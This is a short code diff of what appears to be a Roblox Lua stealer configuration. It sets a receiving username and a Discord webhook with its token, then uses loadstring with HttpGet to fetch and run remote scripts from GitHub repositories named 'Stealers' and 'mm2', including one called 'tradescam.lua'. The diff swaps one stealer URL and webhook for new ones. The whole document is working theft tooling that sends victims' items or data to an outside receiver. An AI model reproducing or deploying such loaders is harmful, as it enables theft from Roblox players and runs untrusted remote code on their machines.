@@ -1,6 +1,6 @@
-Receiver = "givepetroblox"
-Webhook = "https://discord.com/api/webhooks/1299321943153180712/o6v-lnnPOHmTN6FoiOC54nmwd4aseU-F4htMKn_p5qtninzGelS_jRzfPAr8JX04CQaj"
+Username = "givepetroblox" --// Username
+Webhook = "https://discord.com/api/webhooks/1305433436755853314/b7HCdbAdCh0YRkjjKX0iZfduUKJyW2YCO7uMd7weCXri4NQzFvJSS6bS2kaEwOxMOo7s" --// Webhook
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjq/Stealers/refs/heads/main/losg.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjpq/mm2/refs/heads/main/testo.lua"))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjpq/mm2/refs/heads/main/tradescam.lua"))()
